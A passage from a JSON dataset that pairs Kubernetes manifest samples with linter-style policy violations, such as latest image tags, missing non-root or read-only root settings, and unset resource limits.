    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: db\n  name: db\n  namespace: vote\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: db\n  template:\n    metadata:\n      labels:\n        app: db\n    spec:\n      containers:\n      - image: postgres:latest\n        name: postgres\n        env:\n        - name: POSTGRES_USER\n          value: postgres\n        - name: POSTGRES_PASSWORD\n          value: postgres\n        ports:\n        - containerPort: 5432\n          name: postgres\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: db-data\n      volumes:\n      - name: db-data\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "9969",
    "manifest_path": "data/manifests/the_stack_sample/sample_3839.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9970\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9970",
    "manifest_path": "data/manifests/the_stack_sample/sample_3839.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9970\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9971",
    "manifest_path": "data/manifests/the_stack_sample/sample_3839.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9970\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9972",
    "manifest_path": "data/manifests/the_stack_sample/sample_3839.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9970\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9973",
    "manifest_path": "data/manifests/the_stack_sample/sample_3839.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9970\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9974",
    "manifest_path": "data/manifests/the_stack_sample/sample_3840.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubia\n  namespace: chp09-set935\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kubia\n  template:\n    metadata:\n      name: kubia\n      labels:\n        app: kubia\n        app.kubernetes.io/version: '3.0'\n    spec:\n      containers:\n      - image: georgebaptista/kubia:v3\n        name: nodejs\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9975",
    "manifest_path": "data/manifests/the_stack_sample/sample_3840.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubia\n  namespace: chp09-set935\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kubia\n  template:\n    metadata:\n      name: kubia\n      labels:\n        app: kubia\n        app.kubernetes.io/version: '3.0'\n    spec:\n      containers:\n      - image: georgebaptista/kubia:v3\n        name: nodejs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nodejs\" does not have a read-only root file system"
  },
  {
    "id": "9976",
    "manifest_path": "data/manifests/the_stack_sample/sample_3840.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubia\n  namespace: chp09-set935\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kubia\n  template:\n    metadata:\n      name: kubia\n      labels:\n        app: kubia\n        app.kubernetes.io/version: '3.0'\n    spec:\n      containers:\n      - image: georgebaptista/kubia:v3\n        name: nodejs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nodejs\" is not set to runAsNonRoot"
  },
  {
    "id": "9977",
    "manifest_path": "data/manifests/the_stack_sample/sample_3840.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubia\n  namespace: chp09-set935\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kubia\n  template:\n    metadata:\n      name: kubia\n      labels:\n        app: kubia\n        app.kubernetes.io/version: '3.0'\n    spec:\n      containers:\n      - image: georgebaptista/kubia:v3\n        name: nodejs\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nodejs\" has cpu request 0"
  },
  {
    "id": "9978",
    "manifest_path": "data/manifests/the_stack_sample/sample_3840.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubia\n  namespace: chp09-set935\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: kubia\n  template:\n    metadata:\n      name: kubia\n      labels:\n        app: kubia\n        app.kubernetes.io/version: '3.0'\n    spec:\n      containers:\n      - image: georgebaptista/kubia:v3\n        name: nodejs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nodejs\" has memory limit 0"
  },
  {
    "id": "9979",
    "manifest_path": "data/manifests/the_stack_sample/sample_3841.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: image-processor-deployment\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      component: image-processor\n  template:\n    metadata:\n      labels:\n        component: image-processor\n        tier: backend\n    spec:\n      containers:\n      - name: image-processor\n        image: docker.pkg.github.com/mrsupiri/speculo/image-processor:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        env:\n        - name: FACE_SERVICE_URL\n          value: http://face-service-cluster-ip-service/api/v1/faces\n        - name: COMPARATOR_URL\n          value: http://facecomparator-cluster-ip-service/v1/models/facecomparator:predict\n        - name: FACEDETECTOR_URL\n          value: http://facedetector-cluster-ip-service/v1/models/facedetector:predict\n        - name: FINGERPRINTER_URL\n          value: http://fingerprinter-cluster-ip-service/v1/models/fingerprinter:predict\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"image-processor\" is using an invalid container image, \"docker.pkg.github.com/mrsupiri/speculo/image-processor:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9980",
    "manifest_path": "data/manifests/the_stack_sample/sample_3841.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: image-processor-deployment\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      component: image-processor\n  template:\n    metadata:\n      labels:\n        component: image-processor\n        tier: backend\n    spec:\n      containers:\n      - name: image-processor\n        image: docker.pkg.github.com/mrsupiri/speculo/image-processor:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        env:\n        - name: FACE_SERVICE_URL\n          value: http://face-service-cluster-ip-service/api/v1/faces\n        - name: COMPARATOR_URL\n          value: http://facecomparator-cluster-ip-service/v1/models/facecomparator:predict\n        - name: FACEDETECTOR_URL\n          value: http://facedetector-cluster-ip-service/v1/models/facedetector:predict\n        - name: FINGERPRINTER_URL\n          value: http://fingerprinter-cluster-ip-service/v1/models/fingerprinter:predict\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9981",
    "manifest_path": "data/manifests/the_stack_sample/sample_3841.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: image-processor-deployment\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      component: image-processor\n  template:\n    metadata:\n      labels:\n        component: image-processor\n        tier: backend\n    spec:\n      containers:\n      - name: image-processor\n        image: docker.pkg.github.com/mrsupiri/speculo/image-processor:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        env:\n        - name: FACE_SERVICE_URL\n          value: http://face-service-cluster-ip-service/api/v1/faces\n        - name: COMPARATOR_URL\n          value: http://facecomparator-cluster-ip-service/v1/models/facecomparator:predict\n        - name: FACEDETECTOR_URL\n          value: http://facedetector-cluster-ip-service/v1/models/facedetector:predict\n        - name: FINGERPRINTER_URL\n          value: http://fingerprinter-cluster-ip-service/v1/models/fingerprinter:predict\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"image-processor\" does not have a read-only root file system"
  },
  {
    "id": "9982",
    "manifest_path": "data/manifests/the_stack_sample/sample_3841.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: image-processor-deployment\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      component: image-processor\n  template:\n    metadata:\n      labels:\n        component: image-processor\n        tier: backend\n    spec:\n      containers:\n      - name: image-processor\n        image: docker.pkg.github.com/mrsupiri/speculo/image-processor:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        env:\n        - name: FACE_SERVICE_URL\n          value: http://face-service-cluster-ip-service/api/v1/faces\n        - name: COMPARATOR_URL\n          value: http://facecomparator-cluster-ip-service/v1/models/facecomparator:predict\n        - name: FACEDETECTOR_URL\n          value: http://facedetector-cluster-ip-service/v1/models/facedetector:predict\n        - name: FINGERPRINTER_URL\n          value: http://fingerprinter-cluster-ip-service/v1/models/fingerprinter:predict\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"image-processor\" is not set to runAsNonRoot"
  },
  {
    "id": "9983",
    "manifest_path": "data/manifests/the_stack_sample/sample_3841.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: image-processor-deployment\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      component: image-processor\n  template:\n    metadata:\n      labels:\n        component: image-processor\n        tier: backend\n    spec:\n      containers:\n      - name: image-processor\n        image: docker.pkg.github.com/mrsupiri/speculo/image-processor:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        env:\n        - name: FACE_SERVICE_URL\n          value: http://face-service-cluster-ip-service/api/v1/faces\n        - name: COMPARATOR_URL\n          value: http://facecomparator-cluster-ip-service/v1/models/facecomparator:predict\n        - name: FACEDETECTOR_URL\n          value: http://facedetector-cluster-ip-service/v1/models/facedetector:predict\n        - name: FINGERPRINTER_URL\n          value: http://fingerprinter-cluster-ip-service/v1/models/fingerprinter:predict\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"image-processor\" has cpu request 0"
  },
  {
    "id": "9984",
    "manifest_path": "data/manifests/the_stack_sample/sample_3841.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: image-processor-deployment\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      component: image-processor\n  template:\n    metadata:\n      labels:\n        component: image-processor\n        tier: backend\n    spec:\n      containers:\n      - name: image-processor\n        image: docker.pkg.github.com/mrsupiri/speculo/image-processor:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n        env:\n        - name: FACE_SERVICE_URL\n          value: http://face-service-cluster-ip-service/api/v1/faces\n        - name: COMPARATOR_URL\n          value: http://facecomparator-cluster-ip-service/v1/models/facecomparator:predict\n        - name: FACEDETECTOR_URL\n          value: http://facedetector-cluster-ip-service/v1/models/facedetector:predict\n        - name: FINGERPRINTER_URL\n          value: http://fingerprinter-cluster-ip-service/v1/models/fingerprinter:predict\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"image-processor\" has memory limit 0"
  },
  {
    "id": "9985",
    "manifest_path": "data/manifests/the_stack_sample/sample_3842.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: indexer-agent\nspec:\n  type: NodePort\n  selector:\n    app: indexer-agent\n  ports:\n  - name: vector-events\n    protocol: TCP\n    port: 8001\n    targetPort: 8001\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:indexer-agent])"
  },
  {
    "id": "9986",
    "manifest_path": "data/manifests/the_stack_sample/sample_3845.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: helloworld\n  namespace: default\n  labels:\n    app: helloworld\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: helloworld\n  template:\n    metadata:\n      labels:\n        app: helloworld\n    spec:\n      containers:\n      - name: helloworld\n        image: alpine:latest\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'i=0; while true; do echo \"$HOSTNAME - $i: $(date): Hello, World!\"; i=$((i+1));\n          sleep .01; done'\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"helloworld\" is using an invalid container image, \"alpine:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9987",
    "manifest_path": "data/manifests/the_stack_sample/sample_3845.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: helloworld\n  namespace: default\n  labels:\n    app: helloworld\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: helloworld\n  template:\n    metadata:\n      labels:\n        app: helloworld\n    spec:\n      containers:\n      - name: helloworld\n        image: alpine:latest\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'i=0; while true; do echo \"$HOSTNAME - $i: $(date): Hello, World!\"; i=$((i+1));\n          sleep .01; done'\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"helloworld\" does not have a read-only root file system"
  },
  {
    "id": "9988",
    "manifest_path": "data/manifests/the_stack_sample/sample_3845.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: helloworld\n  namespace: default\n  labels:\n    app: helloworld\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: helloworld\n  template:\n    metadata:\n      labels:\n        app: helloworld\n    spec:\n      containers:\n      - name: helloworld\n        image: alpine:latest\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - 'i=0; while true; do echo \"$HOSTNAME - $i: $(date): Hello, World!\"; i=$((i+1));\n          sleep .01; done'\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 50m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"helloworld\" is not set to runAsNonRoot"
  },
  {
    "id": "9989",
    "manifest_path": "data/manifests/the_stack_sample/sample_3846.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: helloweb\n  labels:\n    app: hello\nspec:\n  selector:\n    app: hello\n    tier: web\n  ports:\n  - port: 80\n    targetPort: 8080\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:hello tier:web])"
  },
  {
    "id": "9990",
    "manifest_path": "data/manifests/the_stack_sample/sample_3847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: arudenia/hipster-frontend:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9991",
    "manifest_path": "data/manifests/the_stack_sample/sample_3847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: arudenia/hipster-frontend:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "9992",
    "manifest_path": "data/manifests/the_stack_sample/sample_3847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: arudenia/hipster-frontend:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"server\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9993",
    "manifest_path": "data/manifests/the_stack_sample/sample_3847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: arudenia/hipster-frontend:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "9994",
    "manifest_path": "data/manifests/the_stack_sample/sample_3847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: arudenia/hipster-frontend:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "9995",
    "manifest_path": "data/manifests/the_stack_sample/sample_3847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: arudenia/hipster-frontend:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "9996",
    "manifest_path": "data/manifests/the_stack_sample/sample_3848.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: go-log\nspec:\n  template:\n    metadata:\n      name: go-log\n      labels:\n        job: go-log\n    spec:\n      containers:\n      - name: go-log\n        image: gcr.io/nmiu-play/go-log\n        env:\n        - name: COUNT\n          value: '1000'\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9997",
    "manifest_path": "data/manifests/the_stack_sample/sample_3848.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: go-log\nspec:\n  template:\n    metadata:\n      name: go-log\n      labels:\n        job: go-log\n    spec:\n      containers:\n      - name: go-log\n        image: gcr.io/nmiu-play/go-log\n        env:\n        - name: COUNT\n          value: '1000'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"go-log\" is using an invalid container image, \"gcr.io/nmiu-play/go-log\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9998",
    "manifest_path": "data/manifests/the_stack_sample/sample_3848.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: go-log\nspec:\n  template:\n    metadata:\n      name: go-log\n      labels:\n        job: go-log\n    spec:\n      containers:\n      - name: go-log\n        image: gcr.io/nmiu-play/go-log\n        env:\n        - name: COUNT\n          value: '1000'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"go-log\" does not have a read-only root file system"
  },
  {
    "id": "9999",
    "manifest_path": "data/manifests/the_stack_sample/sample_3848.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: go-log\nspec:\n  template:\n    metadata:\n      name: go-log\n      labels:\n        job: go-log\n    spec:\n      containers:\n      - name: go-log\n        image: gcr.io/nmiu-play/go-log\n        env:\n        - name: COUNT\n          value: '1000'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"go-log\" is not set to runAsNonRoot"
  },
  {
    "id": "10000",
    "manifest_path": "data/manifests/the_stack_sample/sample_3848.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: go-log\nspec:\n  template:\n    metadata:\n      name: go-log\n      labels:\n        job: go-log\n    spec:\n      containers:\n      - name: go-log\n        image: gcr.io/nmiu-play/go-log\n        env:\n        - name: COUNT\n          value: '1000'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"go-log\" has cpu request 0"
  },
  {
    "id": "10001",
    "manifest_path": "data/manifests/the_stack_sample/sample_3848.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: go-log\nspec:\n  template:\n    metadata:\n      name: go-log\n      labels:\n        job: go-log\n    spec:\n      containers:\n      - name: go-log\n        image: gcr.io/nmiu-play/go-log\n        env:\n        - name: COUNT\n          value: '1000'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"go-log\" has memory limit 0"
  },
  {
    "id": "10002",
    "manifest_path": "data/manifests/the_stack_sample/sample_3849.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: phabricator-proxy\n  namespace: buildkite\nspec:\n  selector:\n    matchLabels:\n      app: phabricator-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: phabricator-proxy\n    spec:\n      containers:\n      - name: phabricator-proxy\n        image: gcr.io/llvm-premerge-checks/phabricator-proxy:latest\n        ports:\n        - containerPort: 8080\n        env:\n        - name: BUILDKITE_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: buildkite-api-token\n              key: token\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 2\n          failureThreshold: 5\n        resources:\n          limits:\n            cpu: 500m\n            memory: 1500Mi\n          requests:\n            cpu: 500m\n            memory: 1500Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"phabricator-proxy\" is using an invalid container image, \"gcr.io/llvm-premerge-checks/phabricator-proxy:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10003",
    "manifest_path": "data/manifests/the_stack_sample/sample_3849.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: phabricator-proxy\n  namespace: buildkite\nspec:\n  selector:\n    matchLabels:\n      app: phabricator-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: phabricator-proxy\n    spec:\n      containers:\n      - name: phabricator-proxy\n        image: gcr.io/llvm-premerge-checks/phabricator-proxy:latest\n        ports:\n        - containerPort: 8080\n        env:\n        - name: BUILDKITE_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: buildkite-api-token\n              key: token\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 2\n          failureThreshold: 5\n        resources:\n          limits:\n            cpu: 500m\n            memory: 1500Mi\n          requests:\n            cpu: 500m\n            memory: 1500Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"phabricator-proxy\" does not have a read-only root file system"
  },
  {
    "id": "10004",
    "manifest_path": "data/manifests/the_stack_sample/sample_3849.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: phabricator-proxy\n  namespace: buildkite\nspec:\n  selector:\n    matchLabels:\n      app: phabricator-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: phabricator-proxy\n    spec:\n      containers:\n      - name: phabricator-proxy\n        image: gcr.io/llvm-premerge-checks/phabricator-proxy:latest\n        ports:\n        - containerPort: 8080\n        env:\n        - name: BUILDKITE_API_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: buildkite-api-token\n              key: token\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 2\n          failureThreshold: 5\n        resources:\n          limits:\n            cpu: 500m\n            memory: 1500Mi\n          requests:\n            cpu: 500m\n            memory: 1500Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"phabricator-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "10005",
    "manifest_path": "data/manifests/the_stack_sample/sample_3851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loom-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dappchain\n  template:\n    metadata:\n      labels:\n        app: dappchain\n    spec:\n      containers:\n      - name: node\n        image: loomnetwork/loom\n",
